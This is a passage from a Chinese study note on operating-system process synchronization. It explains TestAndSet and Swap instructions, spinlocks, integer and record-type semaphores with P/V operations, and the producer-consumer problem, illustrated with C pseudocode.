class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">while</span> (TestAndSet(&amp;lock));        <span class="hljs-comment">// “上锁”并“检查”</span><br>临界区代码段...<br>lock = <span class="hljs-literal">false</span>;                     <span class="hljs-comment">// “解锁”</span><br>剩余区代码段...<br></code></pre></td></tr></table></figure><p>代码说明： 若刚开始 <code>lock</code> 是 <code>false</code>，则<code>TSL</code> 返回的 <code>old</code> 值为<code>false</code>，<code>while</code>循环条件不满足，直接跳过循环，进入临界区。 若刚开始 <code>lock</code> 是<code>true</code>，则执行 <code>TSL</code> 后 <code>old</code>返回的值为 <code>true</code>，<code>while</code>循环条件满足，会一直循环，直到当前访问临界区的进程在退出区进行“解锁”。</p><blockquote><p>简而言之：</p><p>假设lock现在为false，代表临界资源A空闲，那么我就可以访问这个资源，同时将lock=true，提醒别的进程，这个临界资源A我正在使用，你先别急，等等，然后用完之后再<code>lock = false;</code>，解锁，让别人能用</p><p>假设lock为true，代表临界资源正在有人使用，所以我必须等待，并且将lock=true，这无所谓，反正已经是true了</p><p><code>lock=true</code>这个语句只是为了让lock为false时可以上锁</p></blockquote><p>相比软件实现方法，<code>TSL</code>指令把“上锁”和“检查”操作用硬件的方式变成了一气呵成的原子操作。</p><ul><li>优点：实现简单，无需像软件实现方法那样严格检查是否会有逻辑漏洞；适用于多处理机环境</li><li>缺点：不满足“<strong>让权等待</strong>”原则，暂时无法进入临界区的进程会占用CPU并循环执行<code>TSL</code> 指令，从而导致“忙等”。</li></ul><h3 id="swap指令">3. Swap指令</h3><p>有的地方也叫 <code>Exchange</code> 指令，或简称 <code>XCHG</code>指令。 <code>Swap</code>指令是用硬件实现的，执行的过程不允许被中断，只能一气呵成。</p><p>以下是用C语言描述的逻辑：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// swap原语</span><br><span class="hljs-comment">// swap指令的作用是交换两个变量的值</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">Swap</span> <span class="hljs-params">(<span class="hljs-type">bool</span> *a, <span class="hljs-type">bool</span> *b)</span><br>&#123;<br>    <span class="hljs-type">bool</span> temp;<br>    temp = *a;<br>    *a = *b;<br>    *b = temp;<br>&#125;<br></code></pre></td></tr></table></figure><p>以下是使用Swap指令 实现互斥的算法逻辑，<code>lock</code>表示当前临界区是否被加锁</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// true 表示已经加锁， false 表示未加锁</span><br><span class="hljs-type">bool</span> old = <span class="hljs-literal">true</span>;<br><span class="hljs-keyword">while</span> (old == <span class="hljs-literal">true</span>)&#123;<br>    Swap (&amp;lock, &amp;old);<br>&#125;<br>临界区代码段...<br>lock = <span class="hljs-literal">false</span>;<br>剩余区代码段...<br></code></pre></td></tr></table></figure><p>逻辑上来看 <code>Swap</code> 和 <code>TSL</code>并无太大区别，都是先记录下此时临界区是否已经被上锁（记录在<code>old</code> 变量上），再将上锁标记 <code>lock</code> 设置为<code>true</code>，最后检查 <code>old</code>. 如果 <code>old</code> 为<code>false</code>则说明之前没有别的进程对临界区上锁，则可跳出循环，进入临界区。</p><blockquote><p>清晰地说：</p><p>①<code>old</code>是每个进程都要进行的一步，都必须将<code>old=true</code></p><p>②因为<code>lock</code>是某一特定临界资源的共享变量，当每一个进程准备访问这个特定的临界资源时，初始化<code>old=true</code>，然后进入<code>while</code>循环进行交换</p><p>③如果当前<code>lock</code>是<code>false</code>，则交换后old=false，则当前进程可以跳出循环进入临界区代码段，同时因为交换，<code>lock=old=true</code>上锁，不让别的进程来打扰，别的进程会因为<code>lock</code>变为<code>true</code>，一直在<code>while</code>循环等待</p><p>④当使用完临界资源，则将<code>lock=false</code>，此时别的进程再交换<code>old</code>和<code>lock</code>就能再判断<code>old=false</code>，就又进入了③步骤，可以跳出循环，使用临界资源。</p></blockquote><p>优缺点跟Test-and-Set指令一样，因为他俩逻辑上是基本一样的东西</p><ul><li>优点：实现简单，无需像软件实现方法那样严格检查是否会有逻辑漏洞；适用于多处理机环境</li><li>缺点：不满足“<strong>让权等待</strong>”原则，暂时无法进入临界区的进程会占用CPU并循环执行<code>Swap</code>指令，从而导致“忙等”。</li></ul><h3 id="互斥总结">*互斥🔒总结</h3><p>前面的七种方式其实都是🔒，下面对他们统一总结：</p><p>解决临界区最简单的工具就是互斥锁 (mutex lock)。</p><p>一个进程在进入临界区时应获得锁，在退出临界区时释放锁。函数<code>acquire()</code>获得锁，而函数 <code>release()</code>释放锁。</p><p>每个互斥锁有一个布尔变量available，表示锁是否可用。如果锁是可用的，调用<code>acquire()</code>会成功，且锁不再可用。当一个进程试图获取不可用的锁时，会被阻塞，直到锁被释放。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c">acquire()&#123;<br><span class="hljs-keyword">while</span>(!available)<br>           ;          <span class="hljs-comment">//忙等待              </span><br>available = <span class="hljs-literal">false</span>;  <span class="hljs-comment">//获得锁</span><br>&#125;<br>release()&#123;<br>    available = <span class="hljs-literal">true</span>;  <span class="hljs-comment">//释放锁</span><br>&#125;<br><br></code></pre></td></tr></table></figure><p><code>acquire()</code>或<code>release()</code>的执行必须是原子操作，因此互斥锁通常采用硬件机制来实现。</p><p>互斥锁的主要缺点是<strong>忙等待</strong>，当有一个进程在临界区中，任何其他进程在进入临界区时必须连续循环调用<code>acquire()</code>。当多个进程共享同一 CPU 时，就浪费了CPU周期。因此，互斥锁通常用于多处理器系统，一个线程可以在一个处理器上等待，不影响其他线程的执行。</p><p>需要连续循环忙等的互斥锁，都可称为<strong>自旋锁 (spin lock)</strong>，如TSL指令、swap指令、单标志法</p><p>特性:</p><ul><li>需忙等，进程时间片用完才下处理机，违反“让权等待“</li><li>优点：等待期间不用切换进程上下文，多处理器系统中，若上锁的时间短，则等待代价很低，</li><li>常用于多处理器系统，一个核忙等，其他核照常工作，并快速释放临界区</li><li>不太适用于单处理机系统，忙等的过程中不可能解锁</li></ul><blockquote><p>怎么感觉上面这部分总结有点不太懂啊，标记一处地点🐕💧</p></blockquote><h2 id="信号量机制">2.3.4 信号量机制</h2><h3 id="前期总结">0. 前期总结</h3><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312111525892.png"alt="知识总览" /><figcaption aria-hidden="true">知识总览</figcaption></figure><p>为什么引入信号量机制？</p><ul><li>为了更好的解决进程互斥与同步的问题</li></ul><h3 id="信号量机制-1">1. 信号量机制</h3><p>用户进程可以通过使用操作系统提供的<strong>一对原语</strong>来对<strong>信号量</strong>（Semaphore）进行操作，从而很方便的实现了进程互斥、进程同步。</p><ul><li>信号量其实就是一个变量，可以用一个信号量（可以是一个整数，也可以是更复杂的记录型变量）<strong>来表示系统中某种资源的数量</strong>，比如：系统中只有一台打印机，就可以设置一个初值为1 的信号量。</li><li>原语是一种特殊的程序段，其执行只能一气呵成，不可被中断。原语是由关中断/开中断指令实现的。软件解决方案的主要问题是“进入区的各种操作无法一气呵成”，因此如果能把进入区、退出区的操作都用“原语”实现，使这些操作能“一气呵成”就能避免问题。</li></ul><p>一对原语：<code>wait(S)</code> 原语和 <code>signal(S)</code>原语，可以把原语理解为我们自己写的函数，函数名分别为 <code>wait</code>和 <code>signal</code>，括号里的信号量 S其实就是函数调用时传入的一个参数。</p><blockquote><p><code>wait</code>、<code>signal</code> 原语常简称为P、V操作（来自荷兰语 proberen 和 verhogen）。</p></blockquote><p>常把<code>wait(S)</code>、<code>signal(S)</code> 两个操作分别写为<code>P(S)</code>、<code>V(S)</code>。</p><h3 id="整型信号量">2. 整型信号量</h3><p>用一个整数型的变量作为信号量，用来表示系统中某种资源的数量。</p><blockquote><p>与普通整数变量的区别：对信号量的操作只有三种，即<code>初始化</code>、<code>P操作</code>、<code>V操作</code>。</p></blockquote><p>eg：某计算机系统中有一台打印机</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> S = <span class="hljs-number">1</span>;                <span class="hljs-comment">// 初始型整型信号量s，表示当前系统中可用的打印机资源数</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">wait</span> <span class="hljs-params">(<span class="hljs-type">int</span> S)</span>&#123;         <span class="hljs-comment">// wait 原语，相当于“进入区”</span><br>    <span class="hljs-keyword">while</span> (S &lt;= <span class="hljs-number">0</span>);       <span class="hljs-comment">// 如果资源数不够，就一直循环等待</span><br>    S--;                  <span class="hljs-comment">// 如果资源数够，则占用一个资源</span><br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">signal</span> <span class="hljs-params">(<span class="hljs-type">int</span> S)</span>&#123;      <span class="hljs-comment">// signal 原语，相当于“退出区”</span><br>    S++;                <span class="hljs-comment">// 使用完资源后，在退出区释放资源</span><br>&#125;<br></code></pre></td></tr></table></figure><p>进程 P0 ：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// ...</span><br>wait (S);                 <span class="hljs-comment">// 进入区，申请资源</span><br><span class="hljs-comment">// 使用打印机资源...       // 临界区，访问资源</span><br>signal(S);                <span class="hljs-comment">// 退出区，释放资源</span><br><span class="hljs-comment">// ...</span><br></code></pre></td></tr></table></figure><p>当P0在访问打印机资源的时候，假如说发生了进程切换，有另外的进程，比如进程P1，它也想使用打印机这种资源，所以使用之前先执行<code>wait (S);</code>，但是打印机已经被P0占用了，S是0，就一直循环等待，直到P0进程把打印机资源释放</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// ...</span><br>wait (S);                <span class="hljs-comment">// 进入区，申请资源</span><br><span class="hljs-comment">// 使用打印机资源...      // 临界区，访问资源</span><br>signal(S);               <span class="hljs-comment">// 退出区，释放资源</span><br><span class="hljs-comment">// ...</span><br></code></pre></td></tr></table></figure><p>...</p><p>进程 Pn （执行过程跟P1一样）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// ...</span><br>wait (S);                <span class="hljs-comment">// 进入区，申请资源</span><br><span class="hljs-comment">// 使用打印机资源...      // 临界区，访问资源</span><br>signal(S);               <span class="hljs-comment">// 退出区，释放资源</span><br><span class="hljs-comment">// ...</span><br></code></pre></td></tr></table></figure><p>在任何一个进程开始执行的时候，进入程序内部执行检查操作，检查信号量资源是否被完全占据，如果被占据，就一直忙等待，等有空闲信号量资源的时候，再占据这个信号量。<strong>“检查”和“上锁”一气呵成</strong>，避免了并发、异步导致的问题。（双标志先检查法的改进，用一个原语来实现的）</p><p>存在的问题：不满足“让权等待”原则，会发生“忙等”（<strong>忙等</strong>，busywait，当一个进程正处在某临界区内，任何试图进入其临界区的进程都必须进入代码连续循环，陷入忙等状态，连续测试一个变量直到某个值出现为止）。</p><h3 id="记录型信号量">3. 记录型信号量⭐</h3><p>整型信号量的缺陷是存在“忙等”问题，因此人们又提出了“<strong>记录型信号量</strong>”，即用记录型数据结构表示的信号量。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* 记录型信号量的定义 */</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>    <span class="hljs-type">int</span> value;                 <span class="hljs-comment">// 剩余资源数，S.value 的初值表示系统中某种资源的数目。</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">process</span> *<span class="hljs-title">L</span>;</span>         <span class="hljs-comment">// 等待队列</span><br>&#125; Semaphore;<br><br><span class="hljs-comment">/* 某进程需要使用资源时，通过wait原语申请 */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">wait</span><span class="hljs-params">(Semaphore S)</span> &#123;<br>    S.value--;<br>    <span class="hljs-keyword">if</span> (S.value &lt; <span class="hljs-number">0</span>) &#123;<br>        block (S.L);  <br>        <span class="hljs-comment">//如果剩余资源数不够，使用block原语使进程从运行态进入阻塞态，并挂到信号量S的等待队列（即阻塞队列）中。</span><br>    &#125;<br>&#125;<br><br><span class="hljs-comment">/*进程使用完资源后，通过signal 原语释放*/</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">signal</span> <span class="hljs-params">(Semaphore S)</span> &#123;<br>    s.value++;<br>    <span class="hljs-keyword">if</span> (S.value &lt;= <span class="hljs-number">0</span>) &#123;<br>        wakeup(S.L);<br>        <span class="hljs-comment">//释放资源后，若还有别的进程在等待这种资源，则使用wakeup原语唤醒等待队列中的一个进程，该进程从阻塞态变为就绪态。</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>一个例子</li></ul><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312111625591.png"alt="记录型信号量例子" /><figcaption aria-hidden="true">记录型信号量例子</figcaption></figure><blockquote><p>可以去看原视频，更好理解</p></blockquote><p>最初：</p><ol type="1"><li>剩余资源数：2</li><li>等待队列：<code>-&gt;null</code></li></ol><p>P0进程申请：</p><ol type="1"><li>执行<code>wait(S)</code>原语，<code>value--</code>，剩余资源数：1，等待队列：<code>-&gt;null</code></li><li>把红色打印机分配给P0</li></ol><p>P1进程申请：</p><ol type="1"><li>执行<code>wait(S)</code>原语，<code>value--</code>，剩余资源数：0，<code>S.value=0</code>，资源恰好分配完，等待队列：<code>-&gt;null</code></li><li>把绿色打印机分配给P1</li></ol><p>P2进程申请：</p><ol type="1"><li>执行<code>wait(S)</code>原语，<code>value--</code>，剩余资源数：-1，<code>S.value = -1</code>，</li><li>因为<code>S.value &lt; 0</code>，执行<code>block (S.L);</code>，等待队列：<code>-&gt;P2</code></li></ol><p>P3进程申请：</p><ol type="1"><li>执行<code>wait(S)</code>原语，<code>value--</code>，剩余资源数：-2，<code>S.value = -2</code>，</li><li>因为<code>S.value &lt; 0</code>，执行<code>block (S.L);</code>，等待队列：<code>-&gt;P2-&gt;P3</code></li></ol><p>假设P0进程使用完打印机了，</p><ol type="1"><li>执行<code>signal(S)</code>原语，<code>value++</code>，剩余资源数：-1，<code>S.value = -1</code>，还是小于等于0，说明等待队列当中还是有进程等待</li><li>执行<code>signal(S)</code>原语中的<code>wakeup(S.L);</code>，用于唤醒信号量对应的等待队列当中队头的进程<code>P2</code>，<code>P2</code>由阻塞态变为就绪态，等待队列：<code>-&gt;P3</code></li><li>把红色打印机分配给P2</li></ol><p>假设P2进程使用完打印机了，</p><ol type="1"><li>执行<code>signal(S)</code>原语，<code>value++</code>，剩余资源数：0，<code>S.value = 0</code>，还是小于等于0，说明等待队列当中还是有进程等待</li><li>执行<code>signal(S)</code>原语中的<code>wakeup(S.L);</code>，用于唤醒信号量对应的等待队列当中队头的进程<code>P3</code>，等待队列：<code>-&gt;null</code></li><li>把红色打印机分配给P3</li></ol><p>如果之后CPU又回到为P1服务，P1也用完了打印机</p><ol type="1"><li>执行<code>signal(S)</code>原语，<code>value++</code>，剩余资源数：1，<code>S.value = 1</code>，这时大于0了，说明等待队列当中已经没有进程等待</li><li>所以在执行<code>signal(S)</code>原语时，不需要执行<code>wakeup(S.L);</code></li><li>P1继续往下执行，结束</li></ol><p>之后CPU为P3服务，P3也用完了打印机</p><ol type="1"><li>执行<code>signal(S)</code>原语，<code>value++</code>，剩余资源数：2，<code>S.value = 2</code>，这时大于0了，说明等待队列当中已经没有进程等待</li><li>所以在执行<code>signal(S)</code>原语时，不需要执行<code>wakeup(S.L);</code></li><li>P3继续往下执行，结束</li></ol><p>对信号量 <code>S</code> 的一次 <code>P</code>操作意味着进程请求一个单位的该类资源，因此需要执行<code>S.value--</code>，表示资源数减1，当<code>S.value &lt; 0</code>时表示该类资源已分配完毕，因此进程应调用 <code>block</code>原语进行自我阻塞（当前运行的进程从运行态 -&gt;阻塞态），主动放弃处理机，并插入到该类资源的等待队列 S.L 中。</p><p>可见，该机制<strong>遵循了“让权等待”原则，不会出现“忙等”现象</strong>。</p><p>对信号量 S 的一次<code>V</code>操作意味着进程释放一个单位的该类资源，因此需要执行<code>S.value++</code>，表示资源数加1，若加1后仍是<code>S.value &lt;= 0</code>，表示依然有进程在等待该类资源，因此应调用<code>wakeup</code>原语唤醒等待队列中的第一个进程（被唤醒进程从阻塞态 -&gt; 就绪态）。</p><blockquote><p>注：若考试中出现 P(S)、V(S)的操作，除非特别说明，否则默认S为记录型信号量</p></blockquote><h2 id="信号量的应用">2.3.5 信号量的应用</h2><h3 id="信号量机制实现进程互斥">1. 信号量机制实现进程互斥</h3><p><strong>实现方法</strong></p><ul><li>分析并发进程的关键活动，<strong>划定临界区</strong>（如：对临界资源打印机的访问就应放在临界区）</li><li>设置互斥信号量 <code>mutex</code>，<strong>初值</strong>为 1</li><li>在进入区 <code>P(mutex)</code> —— 申请资源</li><li>在退出区 <code>V(mutex)</code> —— 释放资源</li></ul><blockquote><p>信号量 <code>mutex</code> 表示“进入临界区的名额”。</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*记录型信号量的定义*/</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>    <span class="hljs-type">int</span> value;                <span class="hljs-comment">// 剩余资源数</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">process</span> *<span class="hljs-title">L</span>;</span>        <span class="hljs-comment">// 等待队列</span><br>&#125; Semaphore;<br><br><br><span class="hljs-comment">/* 信号量机制实现互斥 */</span><br>Semaphore mutex = <span class="hljs-number">1</span>;   <span class="hljs-comment">// 初始化信号量</span><br><span class="hljs-comment">//要会自己定义记录型信号量，但如果题目中没特别说明,可以把信号量的声明简写成这种形式</span><br><br>P1()&#123;<br>    ...<br>    P(mutex);                <span class="hljs-comment">// 使用临界资源前需要加锁</span><br>    临界区代码段<br>    V(mutex);                <span class="hljs-comment">// 使用临界资源后需要解锁</span><br>    ...<br>&#125;<br><br>P2()&#123;<br>    ...<br>    P(mutex);<br>    临界区代码段<br>    V(mutex);<br>    ...<br>&#125;<br></code></pre></td></tr></table></figure><p>注意： 对不同的临界资源需要设置不同的互斥信号量。</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312121507626.png"alt="对不同的临界资源需要设置不同的互斥信号量" /><figcaptionaria-hidden="true">对不同的临界资源需要设置不同的互斥信号量</figcaption></figure><p><strong>P、V操作必须成对出现</strong>。缺少<code>P(mutex)</code>就不能保证临界资源的互斥访问。缺少 <code>V(mutex)</code>会导致资源永不被释放，等待进程永不被唤醒。</p><h3 id="信号量机制实现进程同步">2. 信号量机制实现进程同步</h3><p>进程同步：要让<strong>各并发进程按要求有序地推进</strong>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c">P1()&#123;<br>    代码 <span class="hljs-number">1</span>;<br>    代码 <span class="hljs-number">2</span>; <br>    代码 <span class="hljs-number">3</span>;<br>&#125;<br>P2()&#123;<br>    代码 <span class="hljs-number">4</span>;<br>    代码 <span class="hljs-number">5</span>; <br>    代码 <span class="hljs-number">6</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>比如：P1、P2并发执行，由于存在异步性，因此二者交替推进的次序是不确定的。</p><p>若 P2 的“代码4”要基于 P1的“代码1”和“代码2”的运行结果才能执行，那么我们就必须保证“代码4”一定是在“代码2”之后才会执行。这就是<strong>进程同步问题</strong>，让本来异步并发的进程互相配合，有序推进。</p><p>用信号量实现进程同步：</p><ul><li><p>分析什么地方需要实现“同步关系”，即必须保证“一前一后”执行的两个操作（或两句代码）；</p></li><li><p>设置同步信号量 S，初始为 0；</p></li><li><p>在“前操作”之后执行 V(S)；</p></li><li><p>在“后操作”之前执行 P(S)；</p><blockquote><p>前V后P</p></blockquote></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* 信号量机制实现同步 */</span><br>Semaphore S = <span class="hljs-number">0</span>;<br><br>P1()&#123;<br>    代码 <span class="hljs-number">1</span>;<br>    代码 <span class="hljs-number">2</span>; <br>    V(S);   <br>    代码 <span class="hljs-number">3</span>;<br>&#125;<br><br>P2()&#123;    <span class="hljs-comment">// P2 的执行需要依赖一种信号量资源S，而这种资源只能由P1 释放，因此保证必须 P1 后再 P2</span><br>    P(S);<br>    代码 <span class="hljs-number">4</span>;<br>    代码 <span class="hljs-number">5</span>; <br>    代码 <span class="hljs-number">6</span>;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>若先执行到 <code>V(S)</code> 操作，则 <code>S++</code> 后<code>S = 1</code>。之后当执行到 <code>P(S)</code> 操作时，由于<code>S = 1</code>，表示有可用资源，会执行 <code>S--</code>，S 的值变回0，P2 进程不会执行 <code>block</code> 原语，而是继续往下执行代码4。</li></ul><blockquote><p>执行顺序 1、2、4、5、6。保证代码4在代码2之后执行</p></blockquote><ul><li>若先执行到 <code>P(S)</code> 操作，由于<code>S = 0</code>，<code>S--</code> 后<code>S = -1</code>，表示此时没有可用资源，因此P操作中会执行 block原语，主动请求阻塞。</li><li>之后当处理机交还处理进程P1，执行完代码2，继而执行 <code>V(S)</code>操作，<code>S++</code>，使 S 变回0，由于此时有进程在该信号量对应的阻塞队列中，因此会在 V 操作中执行<code>wakeup</code> 原语，唤醒 P2 进程。这样 P2 就可以继续执行 代码4了。</li></ul><blockquote><p>理解：信号量S代表“某种资源”，刚开始是没有这种资源的。P2需要使用这种资源，而又只能由P1产生这种资源。</p></blockquote><h3 id="信号量机制实现前驱关系">3. 信号量机制实现前驱关系</h3><blockquote><p>其实是用信号量机制实现进程同步的升级版，多级同步问题，记住前V后P</p></blockquote><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312121521211.png"alt="信号量机制实现前驱关系" /><figcaption aria-hidden="true">信号量机制实现前驱关系</figcaption></figure><h2 id="进程同步与互斥经典问题">2.3.6 进程同步与互斥经典问题</h2><h3 id="生产者-消费者问题">1. 生产者-消费者问题</h3><h4 id="问题描述">(1) 问题描述</h4><p>系统中有一组生产者进程和一组消费者进程，生产者进程每次生产一个产品放入缓冲区，消费者进程每次从缓冲区中取出一个产品并使用。(注：这里的“产品”理解为某种数据)</p><ul><li>生产者、消费者<code>共享</code>一个初始为空、大小为n的缓冲区。</li><li>只有缓冲区没满时，生产者才能把产品放入缓冲区，否则必须等待。</li><li>只有缓冲区不空时，消费者才能从中取出产品，否则必须等待。</li><li>缓冲区是临界资源，各进程必须<code>互斥</code>地访问。</li></ul><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312121535185.png"alt="生产者-消费者问题" /><figcaption aria-hidden="true">生产者-消费者问题</figcaption></figure><h4 id="问题分析">(2) 问题分析</h4><blockquote><p>常把<code>wait(S)</code>、<code>signal(S)</code> 两个操作分别写为<code>P(S)</code>、<code>V(S)</code>。</p></blockquote><p>PV操作题目分析步骤：</p><ol type="1"><li><p>关系分析。找出题目中描述的各个进程，分析它们之间的同步、互斥关系。</p><p>生产者和消费者对缓冲区互斥访问是<code>互斥关系</code>，同时生产者和消费者又是一个相互协作的关系，只有生产者生产之后，消费者才能消费，它们也是<code>同步关系</code>。</p></li><li><p>整理思路。根据各进程的操作流程确定P、V操作的大致顺序。</p><p>生产者每次要消耗 (P)一个空闲缓冲区，并生产(V)一个产品。</p><p>消费者每次要消耗 (P) 一个产品，并增加一个空闲缓冲区(V)。</p><p>往缓冲区放入/取走产品需要互斥。</p></li><li><p>设置信号量。并根据题目条件确定信号量初值。（<strong>互斥信号量初值一般为</strong>1，同步信号量的初始值要看对应资源的初始值是多少）</p></li></ol><p>在这样的环境下，设置信号量如下：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk">semaphore mutex = <span class="hljs-number">1</span>;   <span class="hljs-regexp">//</span> 互斥信号量，实现对缓冲区的互斥访问<br><br>semaphore empty = n;   <span class="hljs-regexp">//</span> 同步信号量，表示空闲缓冲区的数量 <br>semaphore full = <span class="hljs-number">0</span>;    <span class="hljs-regexp">//</span> 同步信号量，表示产品的数量，也即非空缓冲区的数量<br><span class="hljs-regexp">//</span>full表示缓冲区有多少产品，empty表示缓冲区有多少空位<br></code></pre></td></tr></table></figure><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312121621055.png"alt="前驱图" /><figcaption aria-hidden="true">前驱图</figcaption></figure><h4 id="代码实现">(3) 代码实现</h4><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312121621165.png"alt="代码实现" /><figcaption aria-hidden="true">代码实现</figcaption></figure><h4 id="一些分析">(4) 一些分析</h4><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312121625077.png"alt="实现互斥的P操作一定要在实现同步的P操作之后" /><figcaptionaria-hidden="true">实现互斥的P操作一定要在实现同步的P操作之后</figcaption></figure><blockquote><p>如果是按照（3）中的代码</p><p>当缓冲区内已经放满产品时，则<code>empty=0，full=n</code>，</p><p>生产者执行<code>P(empty)</code>，由于已经没有空闲缓冲区，因此生产者被阻塞</p><p>由于生产者被阻塞，因此切换回消费者进程，消费者进程执行<code>P(full)</code>，消耗一个产品，<code>full = n-1</code>，</p><p>然后接着执行<code>P(mutex);从缓冲区取出一个产品;V(mutex);</code>，然后继续<code>V(empty)</code>，增加一个空闲缓冲区，然后就能回到消费者那里执行了……，完美</p></blockquote><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312121626796.png"alt="知识点回顾" /><figcaption aria-hidden="true">知识点回顾</figcaption></figure><h3 id="多生产者-多消费者问题">2. 多生产者-多消费者问题</h3><h4 id="问题描述-1">(1) 问题描述</h4><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312151147746.png"alt="多生产者-多消费者问题" /><figcaption aria-hidden="true">多生产者-多消费者问题</figcaption></figure><p>多意思是多类</p><h4 id="问题分析-1">(2) 问题分析</h4><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312151148404.png"alt="多生产者-多消费者问题" /><figcaption aria-hidden="true">多生产者-多消费者问题</figcaption></figure><h4 id="代码实现-1">(3) 代码实现</h4><p><strong>有mutex：</strong></p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312151150962.png"alt="有mutex" /><figcaption aria-hidden="true">有mutex</figcaption></figure><p><strong>无mutex：</strong></p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312151151343.png"alt="无mutex" /><figcaption 